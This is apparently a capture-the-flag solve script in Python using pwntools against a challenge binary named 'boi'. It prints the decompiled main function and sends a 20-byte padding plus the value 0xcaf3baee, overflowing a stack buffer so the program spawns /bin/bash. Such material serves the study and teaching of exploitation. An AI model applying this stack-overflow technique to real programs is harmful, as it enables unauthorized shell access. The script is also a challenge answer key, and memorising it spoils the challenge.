from pwn import *
'''
***Reversing code***

undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined4 local_28;
  int iStack36;
  undefined4 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 0;
  local_30 = 0;
  local_20 = 0;
  local_28 = 0;
  iStack36 = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&local_38,0x18);
  if (iStack36 == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
'''


p = process('./boi')
#  compare Jump to shell 0x6b4 
# CMP        EAX,0xcaf3baee
address = p32(0xcaf3baee)

#pattern_create.rb  -l 50 = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
#pattern_offset.rb -q 6Aa7 = 20
#offset in 20
offset  = "A" * 20 
payload = offset + address
# $(python -c 'print "0"*0x14 + "\xee\xba\xf3\xca"') | ./boi
p.send(payload)
# win
p.interactive()
